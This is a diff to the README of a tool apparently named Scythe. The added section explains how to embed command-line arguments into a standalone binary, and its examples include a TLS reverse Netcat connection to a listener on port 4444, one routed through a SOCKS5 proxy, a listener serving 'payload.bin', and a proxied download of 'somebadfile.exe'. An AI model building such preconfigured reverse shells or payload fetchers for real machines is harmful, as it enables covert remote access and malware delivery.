@@ -46,7 +46,43 @@ PY
 ./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
 ```
 
-**Manual `go build`:** take the same `JSON` variable as above, then base64 (no newlines) and link:
+**Network subcommands (Netcat, FileTransfer, Proxy):** same idea—embed the exact token list you would pass after `./Scythe` (addresses, ports, `-tls`, `-proxy`, etc.). Use Python whenever a value is awkward to quote in JSON.
+
+Helper script (inline JSON):
+
+```bash
+./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.embedded
+./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./Scythe.embedded
+./scripts/build-embedded.sh '["FileTransfer","-listen","-port","8080","-filename","payload.bin","-tls"]' ./Scythe.embedded
+```
+
+One-liner (Netcat reverse with SOCKS5):
+
+```bash
+JSON=$(python3 -c 'import json; print(json.dumps(["Netcat","-reverse","-address","10.10.10.10","-port","8000","-proxy","127.0.0.1:9050","-tls"]))'
+./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
+```
+
+Longer network argv (paths, hostnames, proxy): heredoc keeps flags readable:
+
+```bash
+JSON=$(python3 <<'PY'
+import json
+print(json.dumps([
+    "FileTransfer",
+    "-download",
+    "-filename", "somebadfile.exe",
+    "-hostname", "10.10.10.10",
+    "-port", "8080",
+    "-proxy", "172.17.0.2:1080",
+    "-tls",
+]))
+PY
+)
+./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
+```
+
+**Manual `go build`:** take the same `JSON` variable as above (Http or network), then base64 (no newlines) and link:
 
 ```bash
 JSON=$(python3 -c 'import json; print(json.dumps(["Http","-url","https://example.com","-timeout","30s"]))')
